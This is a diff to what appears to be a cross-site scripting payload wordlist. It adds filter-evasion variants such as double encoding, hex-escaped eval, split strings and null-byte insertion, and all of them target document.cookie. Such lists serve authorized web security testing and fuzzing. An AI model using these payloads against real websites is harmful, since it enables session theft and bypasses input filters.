@@ -3,7 +3,12 @@
 <script>prompt(1)</script>
 
 <script>alert(document.cookie)</script>
+<script>alert`document.cookie`</script>
 %3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
+%253Cscript%253Ealert(document.cookie)%253C/script%253E
+<script>eval('\x61lert(document.cookie)')</script>
+<script>eval('alert(d'+'ocument.'+'co'+'okie)')</script>
+<s%00c%00r%00i%00p%00t>a%00l%00e%00r%00t(document.cookie);</s%00c%00r%00i%00p%00t>
 
 <script src='x' onerror=alert(document.cookie)></script>
 <script+src='x'+onerror=alert(document.cookie)></script>
@@ -16,6 +21,3 @@
 <script+src='x'+On%09error=alert(document.cookie)></script>
 <script+src='x'+On%0Cerror=alert(document.cookie)></script>
 %3Cscript%0Csrc%3D%27x%27%0Conerror%3Dalert%28document.cookie%29%3E%3C%2Fscript%3E
-
-
-
